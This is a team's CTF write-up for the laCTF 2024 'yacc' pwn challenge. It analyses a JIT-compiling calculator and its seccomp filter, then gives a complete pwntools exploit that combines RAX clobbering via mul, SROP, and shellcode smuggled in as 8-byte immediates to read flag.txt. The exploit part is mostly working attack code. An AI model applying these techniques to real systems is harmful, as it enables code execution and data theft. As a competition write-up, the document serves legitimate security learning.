# laCTF 2024 Writeup (Team: L3ak, 17th)
Competition URL: https://platform.lac.tf/
## Overview

| Challenge | Category  | Points    | Solves    | Flag | Skills
| --------- | --------  | ------    | ------    | ---- | ---
| yacc      | pwn       | 496       | 9         | lactf{y3t_4n0th3R_conTr1v3d_ch4lLeNg3!!} | x64_shellcoding,seccomp,SROP,JIT

## yacc

In this challenge, we are given the src code , executable and Dockerfile [dist.tar.gz](./assets/dist.tar.gz). looking at the src code there's a lot of c code that may or may have been automatically generated. but the challenge name gives us a hint into how it was created . a quick google on `yacc` yielded


> YACC (Yet Another Compiler Compiler) is a tool used to generate a parser. This document is a tutorial for the use of YACC to generate a parser for ExpL. YACC translates a given Context Free Grammar (CFG) specifications (input in input_file. y) into a C implementation.


![interesting](./assets/interesting.gif)

So basically it's a syntax analyzer that creates c code to parse your incoming data given a specific format to look for . cool so far . looking in the src code noticed a file called `parse.y` I wonder what that is about !!<br>
After a bit of research I managed to find some cool resources about the format like this one [ncsu](https://arcb.csc.ncsu.edu/~mueller/codeopt/codeopt00/y_man.pdf) . if you are curious about how it works in full details.<br>
I gotta admit . I didn't really understand it all at the time . just needed to find a foothold in the challenge and understand the correct input format . and differntiate between the code created by `yacc` and the author's code.

Notable rules to keep in mind: 

```c
|	expr '*' expr { $$ = mknode(OMUL, $1, $3); }
|	expr '/' expr { $$ = mknode(ODIV, $1, $3); }
|	expr '%' expr { $$ = mknode(OREM, $1, $3); }
|	expr '+' expr { $$ = mknode(OADD, $1, $3); }
|	expr '-' expr { $$ = mknode(OSUB, $1, $3); }
```

And look at `gen.c` I found this . which looks like asm instructions . so I disassembled them and sure enough I found this

```asm
cadd
   0:   5e                      pop    rsi
   1:   5f                      pop    rdi
   2:   48 01 f7                add    rdi, rsi
   5:   57                      push   rdi
=====
csub
   0:   5e                      pop    rsi
   1:   5f                      pop    rdi
   2:   48 29 f7                sub    rdi, rsi
   5:   57                      push   rdi
=====
cdiv
   0:   5e                      pop    rsi
   1:   5f                      pop    rdi
   2:   48 89 f8                mov    rax, rdi
   5:   48 31 d2                xor    rdx, rdx
   8:   48 f7 f6                div    rsi
   b:   48 89 c7                mov    rdi, rax
   e:   57                      push   rdi
=====
cmul
   0:   5e                      pop    rsi
   1:   5f                      pop    rdi
   2:   48 89 f8                mov    rax, rdi
   5:   48 f7 e6                mul    rsi
   8:   48 89 c7                mov    rdi, rax
   b:   57                      push   rdi
=====
crem
   0:   5e                      pop    rsi
   1:   5f                      pop    rdi
   2:   48 89 f8                mov    rax, rdi
   5:   48 31 d2                xor    rdx, rdx
   8:   48 f7 f6                div    rsi
   b:   48 89 d7                mov    rdi, rdx
   e:   57                      push   rdi
---
cnum
   0:   48 bf 00 00 00 00 00 00 00 00   movabs rdi, 0x0
   a:   57                              push   rdi
```

So now ig it's easy to guess what the binary is doing exactly without the need to actually understand `yacc` or how it parses stuff or even the author code where he create the `ELF` . all we care about are those operations . mul/add... . 

Before every operation gets executed there's a `cnum` . this one pushes something onto the stack . whichever operation comes next will expect that there's one or more values in the stack for it to `pop` . the logic seems pretty solid so far except for some artifacts in `$RAX` and `$RDX` from doing `mul` / `div` . These instructions will operate on `$RAX` and `$RDX` by default and that's gonna be our foothold. 

So far we got some good guesses about how the binary works but nothing beats the good ol' fashioned dynamic analysis . woot woot :D . So let's try some basic input and look at `strace` to see what syscalls it makes and to what purpose.

```shell
make clean && make && echo '(1+1);' | strace -f ./calc

...
openat(AT_FDCWD, "/tmp/a.out", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 3
chmod("/tmp/a.out", 0700)               = 0
read(0, "(1+1);\n", 4096)               = 7
newfstatat(3, "", {st_mode=S_IFREG|0700, st_size=0, ...}, AT_EMPTY_PATH) = 0
write(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\2\0>\0\1\0\0\0xp31\0\0\0\0"..., 155) = 155
close(3)                                = 0
prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)  = 0
prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, {len=15, filter=0x558393cd10a0}) = 0
execve("/tmp/a.out", ["/tmp/a.out"], NULL) = 0
exit(2)                                 = ?
```

Now `strace` has showed us almost everything that we need to start pwn-ing this . let's analyze the output
* First the binary opens a new file `/tmp/a.out`.
* Sets it's permissions to rwx for the current user.
* Writes 155 bytes starting with an b'\x7FELF' which is the magic header for ELF binaries . safe to assume that's the ELF header.
* Does two `prctl` syscalls . if you're familiar with it you'll know that how you create a `seccomp` filter in most pwn challs . there's also the `seccomp` syscall . you can learn more about `seccomp` from [Hacktricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/seccomp) . shout out to the team for creating such an awesome guide <3.
* Executes the target ELF that was just created using `execve` and that will replace the current binary with `/tmp/a.out` and it continue execution from there.
* Exits with `$RDI`=2 which is interesting cause that's the value of the expression `1+1;` we gave to the binary.

Looks like the ELF doesn't get deleted after it gets executed so ig we can examine it to be sure about our findings.
```shell
➜  objdump -M intel -d /tmp/a.out                                     

/tmp/a.out:     file format elf64-x86-64

```

`objdump` isn't disassembling this . well . that's possibly because the headers are not really conforming to the `ELF` specs . just enough to work . which is good enough for us . if it works it works . let's try our beloved trusty debugger `gdb`:

```shell
gdb /tmp/a.out --ex 'starti' --ex 'set disassembly-flavor intel' --ex 'x/20i $rip' 

...
0x0000000031337078 in ?? ()
=> 0x31337078:  mov    eax,0x3c
   0x3133707d:  movabs rdi,0x1
   0x31337087:  push   rdi
   0x31337088:  movabs rdi,0x1
   0x31337092:  push   rdi
   0x31337093:  pop    rsi
   0x31337094:  pop    rdi
   0x31337095:  add    rdi,rsi
   0x31337098:  push   rdi
   0x31337099:  syscall
   0x3133709b:  add    BYTE PTR [rax],al
   0x3133709d:  add    BYTE PTR [rax],al
   0x3133709f:  add    BYTE PTR [rax],al
   0x313370a1:  add    BYTE PTR [rax],al
```

## Vuln

Well well well . looks like we struck gold boys . the very first instruction is `mov eax,0x3c` which is recognizable because it's the `SYS_exit` in x64-Linux . check the syscall table out in [here](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md). but notice how the Jit compiled code is between setting the `$EAX` and `syscall` . And if you recall from above . The Jitted code might not explicitely put anything inside the `$RAX` but implicitely it changes with any `mul`/`div` operation. and if we have control over `$RAX` before the `syscall` we can basically call any syscall we like and pow . we got ourselves a way to divert execution.


## Restrictions

Now since we can change the `syscall` you might be tempted to call `execve` and that's it . but here comes our first hurdle `seccomp`.

### seccomp

The way `seccomp` works is by filtering every `syscall` you make in `kernel-mode` . meaning you don't have control over it . Once it gets set by a process then it stays . there's no way to disable it or work-around it if it's implemented correctly . Whenever you try to do a disallowed syscall the kernel will check the filter first to see if it's allowed or not based on the filter that's imposed on your process. We saw earlier two `prctl` calls to set up this filter . Let's try to dump it and see what we get . For that we need [seccomp-tools](https://github.com/david942j/seccomp-tools).

```shell
➜  seccomp-tools dump ./calc    
1+1;
    line  CODE  JT   JF      K
    =================================
    0000: 0x20 0x00 0x00 0x00000004  A = arch
    0001: 0x15 0x00 0x0c 0xc000003e  if (A != ARCH_X86_64) goto 0014
    0002: 0x20 0x00 0x00 0x00000000  A = sys_number
    0003: 0x15 0x09 0x00 0x00000002  if (A == open) goto 0013
    0004: 0x15 0x08 0x00 0x00000000  if (A == read) goto 0013
    0005: 0x15 0x07 0x00 0x00000001  if (A == write) goto 0013
    0006: 0x15 0x06 0x00 0x0000003c  if (A == exit) goto 0013
    0007: 0x15 0x05 0x00 0x0000000f  if (A == rt_sigreturn) goto 0013
    0008: 0x15 0x00 0x05 0x0000003b  if (A != execve) goto 0014
    0009: 0x20 0x00 0x00 0x00000014  A = filename >> 32 # execve(filename, argv, envp)
    0010: 0x15 0x00 0x03 0x00005653  if (A != 0x5653) goto 0014
    0011: 0x20 0x00 0x00 0x00000010  A = filename # execve(filename, argv, envp)
    0012: 0x15 0x00 0x01 0xebd45013  if (A != 0xebd45013) goto 0014
    0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
    0014: 0x06 0x00 0x00 0x00000000  return KILL
```

You might probably wanna look up some articles about `seccomp` before continuing this cause explaining the filter is out of scope for this write-up . but what I can tell you is the following :
* We can't just call `execve` except with a specific pointer in `$RDI` . and the reason for this is because the author had to execute the ELF file . that was the address in the parent process when it called `execve` . so this call went through but for us we won't be able to replicate the same address and we can't bruteforce it either, Because with every failed attempt we get `SIGSYS` from the kernel for not following the seccomp filter . in short `execve` is out of the question.
* we can do open/read/write without any restrictions. oh but well, we can't do much with them since whenever we come back after the `syscall` we'll be faced with a series of `add BYTE PTR [rax],al` which will definitely `SIGV` our process because `$RAX` is most likely gonna have the return value of the syscall and it won't be a valid writeable memory address and even if it were we still can't execute any instructions after that can't modify the instructions after the `syscall`. 
* which leaves us with `rt_sigreturn` which is actually pretty perfect for our use case . we can do [SROP](https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop) . it can set all the registers including `$RIP` and can let us continue our execution somewhere else if we managed to sneak in some shellcode somehow ;).

## Ideas
* We can do `SROP` which is great but we need to set `$RIP` to a place where shellcode resides and continue execution from.
* We can abuse `CNUM` operation to create jit instructions that have 8 bytes of attacker-controlled data . Remember `CNUM` looked like this:
    ```asm
        0:   48 bf 00 00 00 00 00 00 00 00   movabs rdi, 0x0
        a:   57                              push   rdi
    ```
* If we split our shellcode onto 6 byte gadgets then add `jmp 0x3` at the end we can jump around to the next gadget and continue our flow. . you might ask why specifically `jmp 0x3` . it's because we need to skip the next three bytes . one byte for the `push rdi` at the end `CNUM` and two bytes at the beginning of the next `CNUM` [0x48,0xbf] bytes . after we skip those 3 bytes we find ourselves jumping to our next instruction.



## GAME PLAN
* Create a SROP-Frame with that sets the registers we care about to specific values . Most notable is `$RIP` and `$cs` which has to be set to 0x33 . Because if not the program is gonna `SIGV` so the `$cs` is pretty important.
* hollow out the pieces in the frame where it doesn't have any values in it to create a place for the shellcode.
* Create the shellcode . bear in mind we don't have a valid stack pointer after coming back from `rt_sigreturn` . And we need a writeable map to place the flag buffer ,so we have to get a bit creative or dumb . whichever way you look at it :D.
* We can bruteforce all addresses starting from 0x7ff000000000 by doing `SYS_write` on each ptr if they return without an error then we found the stack or at least writeable pages in memory.
* Once we have the stack we can dump the flag by straight up open/read/write. close and shut case.

And Here is the final exploit.

# Exploit 
```py
from pwn import *
context.arch = 'amd64'

def ONUM(n):
    return b'(%d);'%n

def mul(n,m):
    return b'%d*%d;'%(n,m)

def proof_of_work():
    p.recvuntil(b'proof of work:\n')
    cmd = p.recvuntil(b'solution:')[:-len(b'solution:')].strip()
    print(cmd)
    if input("you cool with this command running on your local machine ?[y/n]") in ['y','Y']:
        p.sendline(process(cmd,shell=True).recvall())


jmp_3           = '.byte 0xeb,0x03'     # needed to hardcode them like this cause pwntools asm complains of relocations otherwise
jl_beginning    = '.byte 0x7c,-28'


shellcode = asm(f"""    
    getStackAddr:
        xor eax,eax
        mov al,SYS_write
        nop;nop
        {jmp_3}

        add rsi,rsp
        syscall
        nop
        {jmp_3}
                
        cmp rax,0x0
        {jl_beginning}  # jump to the getStackAddr if theres an error 
        {jmp_3}


    foundStackInRSI:
        mov rsp,rsi
        mov al,SYS_open # rax is gonna be 0x10
        nop
        {jmp_3}

        push 0
        push rbx
        xor esi,esi
        nop
        {jmp_3}
        
        mov rdi,rsp
        syscall
        nop
        {jmp_3}
        
        mov edi,eax
        xor edx,edx
        mov dl,0x40
        {jmp_3}

    read:
        mov rsi,rsp
        xor eax,eax
        nop
        {jmp_3}

        syscall
        mov dil,0x1
        nop
        {jmp_3}

        mov rsi,rsp
        mov al,SYS_write
        nop
        {jmp_3}

        xor edx,edx
        mov dl,0x40
        syscall
        nop;nop;
""")

frame           = SigreturnFrame(kernel='amd64')
frame.rax       = constants.SYS_write
frame.rsp       = 0x20000                           # step to jump . since the stack is 0x21 pages long I figured it'd be faster
frame.rip       = 0x31337151                        # RIP to the beginning of the my shellcode . hardcoded after tries
frame.rdi       = 0x1                               # STDOUT  
frame.rdx       = 0x10                              # write SYSCALL len . doesn't really matter how much
frame.rsi       = 0x7ff000000000                    # start address to find from . seemed reasonable . but might not work all the time
frame.rbx       = u64(b"flag.txt")                  # the flag so that we can push it in our shellcode
frame.csgsfs    = 0x33

frame   = bytes(frame)[:-2*8]                       # we don't need the whole frame and it's fine bcs we only care about $cs=0x33 . the rest are clobber-able

payload = b''
payload+= mul(constants.SYS_rt_sigreturn,1)         # this mul will set $rax to SYS_rt_sigreturn*1 for us 

for i in range(len(frame),0,-8):                    # we have to put it inverted on the stack
    payload += ONUM(u64(frame[i-8:i]))


start_idx   = payload.index(b'(0);'*(len(shellcode)//8))    # search for a cave in the frame to put the shellcode at
end_idx     = start_idx + (4*(len(shellcode)//8))           # the end of the cave

payload_tmp = payload[:start_idx]                           # hollow out the frame

for i in range(0,len(shellcode),8):                         # insert the shellcode
    payload_tmp += ONUM(u64(shellcode[i:i+8]))

payload_tmp+= payload[end_idx:]                             # add in the end part of the frame
payload     = payload_tmp 

if args.REMOTE:
    p = remote('chall.lac.tf',31169)
    proof_of_work()
elif args.DOCKER:
    p = remote('127.0.0.1',5000)
    proof_of_work()
else:
    p = process('./calc',level='CRITICAL')

p.sendline(payload)
print(p.recvall())

# payload
# 15*1;(0);(0);(0);(0);(0);(51);(0);(825454929);(131072);(0);(1);(16);(8392585648256674918);(0);(140668768878592);(1);(282478349818839089);(282477753056756040);(282570622884152136);(282477742873938248);(282478788704665706);(282477753056856392);(282390538415622025);(282478556786100552);(282477738684581135);(282477738578053448);(10416831501176066609);(0);(0);


# lactf{y3t_4n0th3R_conTr1v3d_ch4lLeNg3!!}
```
![gotcha.gif](./assets/gotcha.gif)